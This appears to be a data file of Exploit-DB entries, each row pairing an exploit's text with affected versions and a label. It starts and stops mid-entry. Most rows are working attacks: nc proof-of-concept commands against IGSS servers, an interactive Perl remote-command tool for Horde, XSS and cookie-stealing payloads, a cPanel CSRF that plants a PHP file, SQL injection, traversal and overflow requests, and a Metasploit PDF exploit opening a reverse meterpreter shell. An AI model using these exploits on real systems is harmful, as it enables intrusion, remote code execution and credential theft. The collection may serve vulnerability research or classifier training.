port 12401 active when the project is started.  The opcode 0x7 is used for handling the RMS report templates and through the ""ReadFile"" (0x6) and ""Write File"" (0x5) commands is possible to exploit a buffer overflow caused by the building of a full path string using a stack buffer of 256 bytes located on the caller function:    0040F840  /$  8B4424 04          MOV EAX,DWORD PTR SS:[ESP+4]   0040F844  |.  50                 PUSH EAX   0040F845  |.  83C1 04            ADD ECX,4   0040F848  |.  51                 PUSH ECX   0040F849  |.  8B4C24 10          MOV ECX,DWORD PTR SS:[ESP+10]   0040F84D  |.  68 54A54300        PUSH 0043A554                ; ""%s\%s.RMS""   0040F852  |.  51                 PUSH ECX   0040F853  |.  E8 120F0100        CALL 0042076A                ; sprintf   0040F858  |.  83C4 10            ADD ESP,10   0040F85B  \.  C2 0800            RETN 8  #######################################################################  =========== The Code ===========  http://aluigi.org/poc/igss_4.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-4.zip (igss_4.zip)  Proof-of-concept via ""ReadFile"":   nc SERVER 12401 < igss_4a.dat  Proof-of-concept via ""Write File"":   nc SERVER 12401 < igss_4b.dat  #######################################################################  Remote Stack Overflow:  ====== Bug ======  IGSSdataServer.exe is a server running on port 12401 active when the project is started.  The opcode 0x7 is used for handling the RMS report templates and after the parsing of the ""Rename"" (0x2), ""Delete"" (0x3) and ""Add"" (0x4) commands it's called the function 0040F910 that builds the string to place in RMS.DIC and that is vulnerable to a buffer overflow on a stack buffer of about 512 bytes:    0040F9FE  |.  8D0432            |LEA EAX,DWORD PTR DS:[EDX+ESI]   0040FA01  |.  8D48 6A           |LEA ECX,DWORD PTR DS:[EAX+6A]   0040FA04  |.  51                |PUSH ECX   0040FA05  |.  8D50 2A           |LEA EDX,DWORD PTR DS:[EAX+2A]   0040FA08  |.  52                |PUSH EDX   0040FA09  |.  0FB650 01         |MOVZX EDX,BYTE PTR DS:[EAX+1]   0040FA0D  |.  8D48 02           |LEA ECX,DWORD PTR DS:[EAX+2]   0040FA10  |.  51                |PUSH ECX   0040FA11  |.  52                |PUSH EDX   0040FA12  |.  8D8424 24020000   |LEA EAX,DWORD PTR SS:[ESP+224]   0040FA19  |.  68 E0A54300       |PUSH 0043A5E0                  ; ""%d,%s,%s,%s""   0040FA1E  |.  50                |PUSH EAX   0040FA1F  |.  E8 460D0100       |CALL 0042076A                  ; sprintf  #######################################################################  =========== The Code ===========  The following proof-of-concept exploits the vulnerability from the ""Rename"" command, mainly because it's the only command not affected by other vulnerabilities before the reaching of this bugged function:  http://aluigi.org/poc/igss_5.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-5.zip (igss_5.zip)    nc SERVER 12401 < igss_5a.dat   (will add the ""old_name"" template)   nc SERVER 12401 < igss_5b.dat  #######################################################################  Remote Format String:  ====== Bug ======  IGSSdataServer.exe is a server running on port 12401 active when the project is started.  The logging function Shmemmgr.logText that places messages in GSST.LOG has a printf-like prototype but the function 0040cec0 that handles all the internal logs doesn't provide the necessary format argument when calls it:    0040CF5B  |>  8D4424 04     LEA EAX,DWORD PTR SS:[ESP+4]   0040CF5F  |.  50            PUSH EAX   0040CF60  |.  57            PUSH EDI   0040CF61  |.  6A 0D         PUSH 0D   0040CF63  |.  6A 01         PUSH 1   0040CF65  |.  FF15 6C834300 CALL DWORD PTR DS:[<&Shmemmgr9.logText>]  ; Shmemmgr.logText   ...   005A55E6   .  8B4D EC       MOV ECX,DWORD PTR SS:[EBP-14]   005A55E9   .  51            PUSH ECX   005A55EA   .  8B55 14       MOV EDX,DWORD PTR SS:[EBP+14]   005A55ED   .  52            PUSH EDX   005A55EE   .  68 00280000   PUSH 2800   005A55F3   .  8D85 E8D7FFFF LEA EAX,DWORD PTR SS:[EBP-2818]   005A55F9   .  50            PUSH EAX   005A55FA   .  FF15 20026200 CALL DWORD PTR DS:[<&MSVCR90.vsprintf_s>] ; MSVCR90.vsprintf_s  Note that is not clear if this vulnerability is exploitable for code execution.  #######################################################################  =========== The Code ===========  http://aluigi.org/poc/igss_6.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-6.zip (igss_6.zip)    nc SERVER 12401 < igss_6.dat  #######################################################################  Remote Stack Overflow:  ====== Bug ======  IGSSdataServer.exe is a server running on port 12401 active when the project is started.  The opcode 0x8 is used for handling the STDREP requests and through the command 0x4 is possible to exploit a buffer overflow caused by the building of a SQL query using a stack buffer of 256 bytes:    0040A4B5   .  8B46 04       MOV EAX,DWORD PTR DS:[ESI+4]   0040A4B8   .  8B48 16       MOV ECX,DWORD PTR DS:[EAX+16]   0040A4BB   .  51            PUSH ECX   0040A4BC   .  83C0 1A       ADD EAX,1A   0040A4BF   .  50            PUSH EAX   0040A4C0   .  68 7C984300   PUSH 0043987C     ; ""UPDATE ReportFormats SET RMSref={%s} WHERE (FormatID=%d)""   0040A4C5   .  8BD7          MOV EDX,EDI   0040A4C7   .  52            PUSH EDX   0040A4C8   .  E8 9D620100   CALL 0042076A     ; sprintf  Note that is not clear if this vulnerability is exploitable for code execution.  #######################################################################  =========== The Code ===========  http://aluigi.org/poc/igss_7.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-7.zip (igss_7.zip)    nc SERVER 12401 < igss_7.dat  #######################################################################  Arbitrary Command Execution:  ====== Bug ======  dc.exe is a server running on port 12397 active when the project is started.  The opcodes 0xa and 0x17 are used for launching the executables located in the folder of the software but through directory traversal is possible to execute any arbitrary executable on the disk where is located the software and specifying any argument for its execution.  #######################################################################  =========== The Code ===========   http://aluigi.org/poc/igss_8.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17024-8.zip (igss_8.zip)  Two examples for executing calc.exe (""calc.exe arg1 arg2 arg3""):   nc SERVER 12397 < igss_8a.dat   nc SERVER 12397 < igss_8b.dat  #######################################################################  ====== 4) Fix ======  No fix.  #######################################################################",['9.00.00.11059'],1
26439,"Snitz Forum 2000 - 'post.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/15241/info  Snitz Forum is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/post.asp?method=Topic&FORUM_ID=1&CAT_ID=1&Forum_Title=General+chat&type=""><script>alert(""PWND"")</script>",['2000'],1
32424,OpenNMS 1.5.x - 'Username' Cross-Site Scripting source: https://www.securityfocus.com/bid/31410/info   OpenNMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   Versions prior to OpenNMS 1.5.94 are vulnerable.   http://www.example.com/opennms/notification/list.jsp?username=%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E,"['1.5.x', '1.5.94']",1
20436,"Apple Mac OSX 10 / HP-UX 9/10/11 / Mandriva 6/7 / RedHat 5/6 / SCO 5 / IRIX 6 - Shell Redirection Race Condition source: https://www.securityfocus.com/bid/2006/info  bash, tcsh, cash, ksh and sh are all variations of the Unix shell distributed with many Unix and Unix clone operating systems. A vulnerability exists in these shells that could allow an attacker to arbitrarily write to files.  A vulnerability has been discovered in a number of Unix shells which may allow a local attacker to corrupt files or potentially elevate privileges.  Scripts and command line operations using << as a redirection operator create files in the /tmp directory with a predictable naming convention. Additionally, files are created in the /tmp directory without first checking if the file already exists.  This could result in a symbolic link attack that could be used to corrupt any file that the owner of the redirecting shell has access to write to. This issue affects those systems running vulnerable versions of bash, tcsh, cash, ksh and sh.  ksh is reportedly not vulnerable for IBM AIX systems.   #!/bin/ksh -x touch /tmp/silly.1 ln -s /tmp/silly.1 /tmp/sh$$.1 ls -l /tmp/silly.* /tmp/sh$$.* cat <<EOF Just some short text EOF ls -l /tmp/silly.* /tmp/sh$$.* rm /tmp/silly.* /tmp/sh$$.*  This example was submitted by proton <proton@energymech.net> in an October 29th, 2001 BugTraq posting:  /tmp# echo 'hello world' > rootfile /tmp# chmod 600 rootfile /tmp# ln -s rootfile sh$$ /tmp# chown -h 666.666 sh$$ /tmp# ls -l rootfile sh$$ -rw------- 1 root root 12 Oct 29 03:55 rootfile lrwxrwxrwx 1 666 666 8 Oct 29 03:56 sh12660 -> rootfile /tmp# cat <<BAR ? FOO ? BAR FOO o world /tmp# ls -l rootfile sh$$ /bin/ls: sh12660: No such file or directory -rw------- 1 root root 12 Oct 29 03:56 rootfile /tmp# cat rootfile FOO o world /tmp#","['10', 'HP-UX 9/10/11', 'Mandriva 6/7', 'RedHat 5/6', 'SCO 5', 'IRIX 6']",1
1650,"Horde Help Viewer 3.1 - Remote Command Execution #!/usr/bin/perl  # Wed Apr  5 21:51:12 CEST 2006 jolascoaga@514.es # # Horde help module remote execution #  # telnet 310.27.901.33.1109 1689 # thanks horatio for the address # USER paranoia # PASS total # SYST # REST 100 # REST 0 # PWD # TYPE A # PASV # LIST # CWD 0days # GET horddy.pl # # w0w this damn 0day ftp is so sexy! #  # GO GO GO !! GO GO GO !! Team fall back! #  # Example: ./horddy.pl --host=http://www.server.com/horde #  # Now for your X-box ! #  # Greets: #  - all 514 crew  #  - mallorca ppl r0xing. # # THIS IS PENE! TIMMY!!! LIVIN' A LIE! #     use strict; use LWP::UserAgent; use LWP::Simple; use HTTP::Request; use HTTP::Response; use Getopt::Long;  $| = 1;   # mess with the best? don't mess with my buffer  my ($proxy,$proxy_user,$proxy_pass); my ($host,$debug,$dir, $command); my $use_ssl = 0;  my $options = GetOptions (   'host=s'      => \$host,    'dir=s'      => \$dir,   'proxy=s'           => \$proxy,   'proxy_user=s'      => \$proxy_user,   'proxy_pass=s'      => \$proxy_pass,   'debug'             => \$debug);  &help unless ($host); # please don't try this at home.  $dir = ""/horde/"" unless($dir); print ""$host - $dir\n"";  while () { print ""horddy> ""; # lost connection while(<STDIN>) { $command=$_; chomp($command); last; } &send($command); }  sub buildcmd {# this is a useful comment my ($cmd) = @_; # wonderful hacking $cmd =~ s/ /\%20/gi; $cmd =~ s/\//\""\.chr\(47\)\.\""/gi;  return $cmd; }  sub send {     my ($tmp) = @_;     my $ok=0;     my $cmd = buildcmd ($tmp); # this is really magic ^^     my $socket;     LWP::Debug::level('+') if $debug; # but remember this is crap :D      my $ua = new LWP::UserAgent();        $ua->agent(""Nozilla/P.N (Just for IDS woring)""); # this is not me :/      my $string = ""/$dir/services/help/?show=about&module=;\"".passthru(\""$cmd\"");'."";      if ($host !~ /^http/) { $host = sprintf (""http://%s"", $host); # CRAP CRAP CRAP     }      my $req = HTTP::Request->new (GET => $host.$string);     $ua->proxy(['http'] => $proxy) if $proxy;     $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;      print $req->as_string() if $debug;       my $res = $ua->request($req);     my $html = $res->content();       foreach (split(/\n/,$html)) { if ((/<h2/) or (/<br \/>/)) { # brum brum conditionals desmitified last; } print ""$_\n"" if $ok eq ""1""; # i don't think this is usefull  if (/<body class=/) { $ok = 1; }       } }  sub help {     print ""Syntax: ./$0 --host=url --dir=/horde [options]\n"";     print ""\t--proxy (http), --proxy_user, --proxy_pass\n"";     print ""\t--debug\n"";     print ""the default directory is /horde\n"";     print ""\nExample\n"";     print ""bash# $0 --host=http(s)://www.server.com/\n"";     print ""\n"";     exit(1); } exit 0; # y00000w this is the best part. # remember mallorca es fonki :D  # milw0rm.com [2006-04-07]",['3.1'],1
24103,"MailEnable Mail Server HTTPMail 1.x - Remote Heap Overflow source: https://www.securityfocus.com/bid/10312/info  MailEnable is a commercially available POP3 and SMTP server for the Windows platform.  The 'Professional' and 'Enterprise' editions of MailEnable are reported to be prone to a remote heap buffer overflow. The overflow allows the attacker to control the EAX and ECX registers, allowing arbitrary code execution as SYSTEM.  All versions up to and including 1.18 are reported to be affected.  If logging is enabled, the request could contain:  GET /{4032 x A} HTTP/1.1  or, without logging:  GET /{8501 x A} HTTP/1.1",['1.x'],1
37652,KindEditor - 'name' Cross-Site Scripting source: https://www.securityfocus.com/bid/55172/info  KindEditor is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  KindEditor versions 4.1.2 and 4.0.6 are vulnerable; other versions may also be affected.   http://www.example.com/kindeditor/index.php?name=<pre><script>alert('XSS');</script>by ZSL!</pre>,"['4.1.2', '4.0.6']",1
30083,"BoxBilling 3.6.11 - 'mod_notification' Persistent Cross-Site Scripting ﻿ BoxBilling 3.6.11 (mod_notification) Stored Cross-Site Scripting Vulnerability   Vendor: BoxBilling Product web page: http://www.boxbilling.com Affected version: 3.6.11 (mod_notification 1.0.0)  Summary: BoxBilling is a free billing, invoicing & client management software.  Desc: BoxBilling suffers from a stored cross-site scripting vulnerability. Input passed to the 'message' POST parameter thru the 'Notification Center' extension/module is not properly sanitised before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: Microsoft Windows 7 Ultimate SP1 (EN)            Apache 2.4.2 (Win32)            PHP 5.4.7            MySQL 5.5.25a   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2013-5163 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5163.php   05.12.2013  --   POST /boxbilling/index.php/api/admin/notification/add HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/25.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: http://localhost/boxbilling/bb-admin.php/notification Content-Length: 66 Cookie: BOXADMR=e%3DZ2pva29AemVyb3NjaWVuY2UubWs%3D%26p%3DZDAzM2UyMmFlMzQ4YWViNTY2MGZjMjE0MGFlYzM1ODUwYzRkYTk5Nw%3D%3D; BOXSID=gsbhumqgrjja1hrei31v3uc4m6 Connection: keep-alive Pragma: no-cache Cache-Control: no-cache  message=%22%3E%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E",['3.6.11'],1
17330,"cPanel < 11.25 - Cross-Site Request Forgery (Add User PHP Script) # Exploit Title: cPanel < 11.25 CSRF - Add php script # Date: 27.05.2011 # Author: ninjashell # Software Link: http://cpanel.net # Version: 11.25 (see details below) # Tested on: Linux # CVE : N/A  I. Introduction cPanel versions below and excluding 11.25 , are vulnerable to CSRF which leads to uploading a PHP script of the attackers liking. If you have turned off security tokens and referrer security check, no matter what version you are using, you are vulnerable as well.  II. Proof of concept (PoC) <html> <form name=""editform"" action="" http://localhost:2082/frontend/x3/err/savefile.html"" method=POST onSubmit=""return loadfdata();""> <input type=""hidden"" id=""codepage"" class=""codepress html"" name=""page"" value=""<?php echo 'ninjashell'; ?>""> <input type=""hidden"" name=""domain"" value=""localhost""> <input type=""hidden"" value=""public_html/"" name=""dir""> <input type=""hidden"" value=""ninjashell.php"" name=""file""> <body onload=""document.forms.editform.submit();""> </form> </html> Afterwards simply check for ninjashell.php in the directory.  III. Counter-measures All cPanel versions starting from 11.25 and above have two in-built security features to prevent such attacks - security tokens and referrer security check. This means that if you are a cpanel client, you should update your software.  IV. About the author. - Ethical hacker; - Freelance security consultant/penetration tester; - Security researcher in the spare time; - Over 12 years of experience; You can always email me ninjashellmail@gmail.com or follow me on twitter @ninjashell1337","['< 11.25', 'below', 'excluding']",1
23635,Niti Telecom Caravan Business Server 2.00-03D - Directory Traversal source: https://www.securityfocus.com/bid/9555/info  The showcode.asp script activated in Sample_showcode.html may be vulnerable to a directory traversal issue. A remote attacker may view any files readable by the web server using '../' escape sequences in URI requests.   http://www.example.org/sample_script_directory/Sample_showcode.html?fname=/../../../../target,['2.00-03D'],1
14968,symphony 2.0.7 - Multiple Vulnerabilities Symphony 2.0.7 Multiple Vulnerabilities bug found by Jose Luis Gongora Fernandez (a.k.a) JosS   contact: sys-project[at]hotmail.com website: http://www.hack0wn.com/   - download: http://downloads.symphony-cms.com/symphony-package/36030/symphony-2.0.7.zip   - CMS:    XSLT-powered open source content management system.  ~ [SQL]   This vulnerability affects /symphony-2.0.7/about/.   The POST variable send-email[recipient] is vulnerable.      send-email[recipient]='  fields%5Bname%5D=111-222-1933email@address.tst&fields%5Bemail%5D=111-222-1933email@address.tst&fields%5Bsubject%5D=General%20Enquiry&fields%5Bmessage%5D=111-222-1933email@address.tst&send-email%5Brecipient%5D='&send-email%5Bsender-email%5D=fields%5Bemail%5D&send-email%5Bsender-name%5D=fields%5Bname%5D&send-email%5Bsubject%5D=fields%5Bsubject%5D&send-email%5Bbody%5D=fields%5Bmessage%5D%2Cfields%5Bsubject%5D%2Cfields%5Bemail%5D%2Cfields%5Bname%5D&action%5Bsave-message%5D=Send  ~ [XSS]   This vulnerability affects /symphony-2.0.7/articles/a-primer-to-symphony-2s-default-theme/.   The POST variable fields[website] is vulnerable.     fields[Bwebsite]=javascript:alert('JosS')  fields%5Bauthor%5D=111-222-1933email@address.tst&fields%5Bemail%5D=111-222-1933email@address.tst&fields%5Bwebsite%5D=javascript:alert(418231608845)&fields%5Bcomment%5D=111-222-1933email@address.tst&fields%5Barticle%5D=3&action%5Bsave-comment%5D=Post%20Comment  ~ [Cookie Manipulation]   This vulnerability affects /symphony-2.0.7/about/.   The POST variable send-email[recipient] is vulnerable.     send-email%5Brecipient%5D=<meta+http-equiv='Set-cookie'+content='cookiename=cookievalue'>  fields%5Bname%5D=111-222-1933email@address.tst&fields%5Bemail%5D=111-222-1933email@address.tst&fields%5Bsubject%5D=General%20Enquiry&fields%5Bmessage%5D=111-222-1933email@address.tst&send-email%5Brecipient%5D=<meta+http-equiv='Set-cookie'+content='cookiename=cookievalue'>&send-email%5Bsender-email%5D=fields%5Bemail%5D&send-email%5Bsender-name%5D=fields%5Bname%5D&send-email%5Bsubject%5D=fields%5Bsubject%5D&send-email%5Bbody%5D=fields%5Bmessage%5D%2Cfields%5Bsubject%5D%2Cfields%5Bemail%5D%2Cfields%5Bname%5D&action%5Bsave-message%5D=Send   ------------ Hack0wn Team By: JosS ------------  __h0__,['2.0.7'],1
48467,"Sellacious eCommerce 4.6 - Persistent Cross-Site Scripting # Exploit Title: Sellacious eCommerce 4.6 - Persistent Cross-Site Scripting # Exploit Author: gurbanli # Date: 2020-05-13 # Vendor Homepage: https://www.sellacious.com # Version: 4.6 # Software Link:  https://www.sellacious.com/free-open-source-ecommerce-software  Document Title: =============== Sellacious eCommerce - Multiple Persistent Vulnerabilities   References (Source): ==================== https://www.vulnerability-lab.com/get_content.php?id=2226   Common Vulnerability Scoring System: ==================================== 4.6   Product & Service Introduction: =============================== https://www.sellacious.com/free-open-source-ecommerce-software   Vulnerability Disclosure Timeline: ================================== 2020-05-08: Public Disclosure (Vulnerability Laboratory)   Technical Details & Description: ================================ A persistent input validation web vulnerability has been discovered in the official Sellacious eCommerce Shop CMS (2020 Q1). The vulnerability allows remote attackers to inject own malicious script codes with persistent attack vector to compromise browser to web-application requests from the application-side.  The cross site web vulnerabilities are located in the all the adress input fields of the `Manage Your Addresses` module. Remote attackers are able to register a low privilege user account to inject own malicious script code to the adress information page. The execution of the script code occurs each time the adress information is used in the web ui of the ecommerce application. The request method to inject is POST and the attack vector is persistent on the application-side.  Successful exploitation of the vulnerabilities results in session hijacking, persistent phishing attacks, persistent external redirects to malicious source and persistent manipulation of affected application modules.  Request Method(s): [+] POST  Vulnerable Module(s): [+] Manage Your Addresses  Vulnerable Input(s): [+] Full name [+] First name [+] Middle name [+] Last name [+] Company [+] PO Box [+] Address [+] Landmark  Affected(s): [+] index.php/manage-your-addresses [+] Backend user adress information listing   Proof of Concept (PoC): ======================= The persistent input validation web vulnerabilities can be exploited by remote attackers with user account and low user interaction. For security demonstration or to reproduce the web vulnerability follow the provided information and steps below to continue.   PoC: Exploitation <iframe src=""evil.source"" onload=alert(document.cookie)> <iframe src=""evil.source"" onload=alert(document.domain)>   PoC: Vulnerable Source <div class=""addresses-container""> <div class=""address-heading""> <h2>Your addresses <a href=""#address-form-0"" role=""button"" data-toggle=""ctech-modal"" class=""ctech-mb-3 btn-add-address ctech-float-right ctech-text-primary""> <i class=""fa fa-plus""></i> <span class=""add-address-text"">Add New Address</span></a></h2></div> <div id=""addresses"" class=""cart-aio ctech-text-center""> <div id=""address-editor""> <ul id=""address-items"" data-original-title="""" title=""""> <li class=""address-item"" id=""address-item-9""> <div class=""ctech-float-right address-action""> <button type=""button"" class=""ctech-btn ctech-btn-small ctech-btn-default hasTooltip remove-address"" data-placement=""bottom"" data-id=""9"" title="""" data-original-title=""Delete""><i class=""fa fa-trash-alt""></i></button> <a href=""#address-form-9"" role=""button"" data-toggle=""ctech-modal"" data-placement=""bottom"" class=""ctech-btn ctech-btn-small ctech-btn-default hasTooltip"" title="""" data-original-title=""Edit""><i class=""fa fa-edit""></i></a> </div> <div class=""address-content""> <span class=""address_name"">>""<iframe src=""evil.source""></span> <span class=""address_company"">>""<iframe src=""evil.source""></span> <span class=""address_po_box"">PO #: >""<iframe src=""evil.source""></span> <span class=""address_address has-comma"">>""<iframe src=""evil.source""></span> <span class=""address_landmark has-comma"">>""<iframe src=""evil.source""></span> <span class=""address_country"">United States</span> <div class=""cart_address_box w100p""> <div class=""cart_address_buttons""> </div> </div> </div> </li> <li class=""address-item odd-address-item""> <a href=""#address-form-0"" role=""button"" data-toggle=""ctech-modal"" class=""btn-new-address""><i class=""fa fa-plus""></i></a> </li> </iframe></span></div></li></ul> <div class=""ctech-wrapper""> </div><div class=""ctech-clearfix""></div> </div><div class=""ctech-clearfix""></div> </div></div>   Credits & Authors: ================== Vulnerability-Lab - https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab Benjamin Kunz Mejri - https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.    --  VULNERABILITY LABORATORY - RESEARCH TEAM",['4.6'],1
28565,"PHP Event Calendar 1.4/1.5 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/20001/info  PHP Event Calendar is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues could allow an attacker to steal cookie-based authentication credentials and to launch other attacks.  Version 1.5.1 is vulnerable; other versions may also be affected.  http://www.example.com/directory_where_you_installed_php_event_calendar/cl_files/index.php Vulnerable fields: title field - ti body field - bi Backgroung Image - cbgi Insert ""<script>alert('XSS Vulnerable');</script>"" in above field and click ""Add event"".","['1.4/1.5', '1.5.1']",1
33791,"Adobe Reader for Android < 11.2.0 - 'addJavascriptInterface' Local Overflow (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core' require 'msf/core/exploit/fileformat' require 'msf/core/exploit/pdf' require 'msf/core/exploit/android'  class Metasploit3 < Msf::Exploit::Remote   Rank = GoodRanking    include Msf::Exploit::FILEFORMAT   include Msf::Exploit::PDF   include Msf::Exploit::Android    def initialize(info = {})     super(update_info(info,       'Name'           => 'Adobe Reader for Android addJavascriptInterface Exploit',       'Description'    => %q{           Adobe Reader versions less than 11.2.0 exposes insecure native           interfaces to untrusted javascript in a PDF. This module embeds the browser           exploit from android/webview_addjavascriptinterface into a PDF to get a           command shell on vulnerable versions of Reader.       },       'License'        => MSF_LICENSE,       'Author'         => [         'Yorick Koster', # discoverer         'joev' # msf module       ],       'References'     =>         [           [ 'CVE', '2014-0514' ],           [ 'EDB', '32884' ],           [ 'OSVDB', '105781' ],         ],       'Platform'       => 'android',       'DefaultOptions' => {         'PAYLOAD' => 'android/meterpreter/reverse_tcp'       },       'Targets'        => [         [ 'Android ARM', {             'Platform' => 'android',             'Arch' => ARCH_ARMLE           }         ],         [ 'Android MIPSLE', {             'Platform' => 'android',             'Arch' => ARCH_MIPSLE           }         ],         [ 'Android X86', {             'Platform' => 'android',             'Arch' => ARCH_X86           }         ]       ],       'DisclosureDate' => 'Apr 13 2014',       'DefaultTarget'  => 0     ))      register_options([       OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),     ], self.class)   end    def exploit     print_status(""Generating Javascript exploit..."")     js = add_javascript_interface_exploit_js(ARCH_ARMLE)     print_status(""Creating PDF..."")     file_create(pdf(js))   end    def trailer(root_obj)     id = @xref.keys.max+1     ""trailer"" << eol << ""<</Size %d/Root "" % id << ioRef(root_obj) << "">>"" << eol   end    def add_compressed(n, data)     add_object(n, Zlib::Inflate.inflate(Rex::Text.decode_base64(data)))   end    def pdf(js)     self.eol = ""\x0d""     @xref = {}     @pdf = header('1.6')      add_compressed(25, ""eJzjtbHRd0wuynfLL8pVMDFQMFAI0vdNLUlMSSxJVDAGc/0Sc1OLFYyNwBz/0pKczDwg3xzMDUhMB7INzcCc4ILMlNQiz7y0fAUjiOrgkqLS5JKQotTUoPz8EgVDiPkhlQWp+s5AC3Ly0+3seAG6CSa9"")     add_compressed(40, ""eJzjtbHRd3HU0PdIzSlTMFAISQMS6Qqa+i5BQAnXvOT8lMy8dCAzwMXNJT8ZJqBgYgpUF2Rnp++Wn1cClPZIdcpXMLYECUKMMjEHs6MSXZIUTCwgikHKM1NzUoqjjcEisXZ2vADEuSJw"")     add_compressed(3, ""eJztV91umzAUfoK8g8UuN2OMIQkWUFWJplUqU7VGam+N7aSs/AmMQvtqvdgj7RVmEpKRNJp2M2kXWAjZ+Hzfd3zO4Uie+D66lflGPQFCMEH3TaxeSokeo1u06iaRVEwwxcKwVpVk2cS/akvGn6UCsdwkeWD8fPthgEQExoMbWVG5kE/Jl9dK3r9+XfHXZ+4J4yqc+C1tszLTZKDN0rymbWAwUcSS6nn3GRlgZ6KeA+O62wCP0R1YFJUErulAblkumM1N7MyIPf0EbAvbyJojm0BMqNU9oB9GONFvvxJr+m35uZfTq8B4UqqkCG23W3NLzKLaIOx5HrJsZNtQW8D6JVeshXn9YU9y4FnKmldJqZIiB92axUWjAsOYgMHoz5WVR6G8NndnNHmRoZaVCJsWugQS/IgpmyrduSY4kqnMZK5qjcMXcVosiv4sl2UXkeUgHic4vaFxBB0D0MVA69CoEMn6ZcmUDHXwHWi5kOAVtil2qD3VS2pZPjqzPONY6ApScsBBdhyEEpe6+KNlHzkGlud+9AX5V54MbS/5UlSrokjDfcFd86qImQJYx23gRW8zgAtO10WVMRWyskwTzrrC6CLno99bp/YqUenQhUNlXafq9OthI026TNGU5ZvAaKGQa9akygi/16ZqlY/2NmeM6D3lzqVzdX9XOHRZ8KYrsJtl2DSJoJ6Yu1NPSjhbizl0nJhBj885nErXtl3iejFzd4E5xb7jvclrxXIuD7wOn1nONNaZcjwCPcuJIXNdGwqOZ3ObxySO8YF3gB3w6tjSu6oQDZdVeMjTg4zBgpWq0T1in7MTs8kwKIM/eN8eUN8fdGtCx970LhX/ZIwio8goMoqMIqPIKPJfiQxuNzLXV5ptd3fRs/7u8wtzq37r"")     add_compressed(32, ""eJzjtbHR93QJVjA0VzBQCNIPDfIBsi1AbDs7XgBc3QYo"")     add_compressed(7, ""eJzjtbHRd84vzStRMNJ3yywqLlGwUDBQCNL3SYQzQyoLUvX9S0tyMvNSi+3seAF54Q8a"")     add_compressed(16, ""eJzjtbHRd84vzStRMNT3zkwpjjYyUzBQCIrVD6ksSNUPSExPLbaz4wUA0/wLJA=="")     add_compressed(22, ""eJzjtbHRD1Mw1DMytbPjBQARcgJ6"")     add_compressed(10, ""eJzjtbHRd85JLC72TSxQMDRUMFAI0vdWMDQCMwISi1LzSkKKUlMVDI3RRPxSK0q8UysVDPVDKgtS9YNLikqTwRJB+fkldna8AIaCG78="")     add_compressed(11, ""eJzjtbHRDy5IKXIsKgGy/PXDU5OcEwtKSotS7YCAFwCW+AmR"")     add_compressed(12, ""eJzjtbHR91YwNFUwUAjSD1AwNAAzgvVd8pNLc1PzSuzseAGGCwiD"")     add_compressed(13, ""eJzjtbHR9yvNLY42UDA0UTBQCIq1s+MFADohBRA="")     add_compressed(14, ""eJzjjTY0VTBQCFKAULG8ABzfA0M="")     add_compressed(15, ""eJzjtbHRd9YPLkgpciwq0feONlAwjNUPUDA0UjBQCNIPSFcwMgOzgvWB8pnJOal2drwAYtsNjA=="")     add_compressed(26, ""eJx1jk0KwkAMhU/QO+QEnRmnrQiloBXEhVBaV4qLoQ0iyGSYH9Dbm7ZrAwn54L2XZHUt9tZSDFAokNCLlmxEy1wWK3tyB/rcZS5h7kpteG53PB/i5Ck50KvyfARdLtsFp5f5a+puoHIpOuP5DqhqsfQYKPkRAz/U0pv84MyIMwwStJ41DZfoKZqIIMUQfRrjGhKYr1+HnPnEpsl+Bag7pA=="")     add_compressed(41, ""eJzjjTa2UDBQCIrlBQAKzAIA"")     add_compressed(54, ""eJwBzwAw/w08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvTGVuZ3RoIDE1ND4+c3RyZWFtDUiJXE7BDcIwFLv3K/IFvlatYzAG66bgYSDM2/BQa6cDXWV7gv69m7d5SEISCKGs57axjpEklDFbd/MX1GQCc3jgRMaEN2oNDSVHrMeoep358/SgXQjse9Dx5w722naW29AhTU2RQ2zLkSivJNwABQyuE0pitYGO1SLSiJbxJL0XjaDpibv76UiZ7wvI+cx/rWb1V4ABAMukNiwNZW5kc3RyZWFtDcyfYBU="")     add_compressed(34, ""eJzjtbHRdw5WMDZTMFAI0g/WDylKzCsuSCxKzUuutLPjBQB75gjK"")     add_compressed(35, 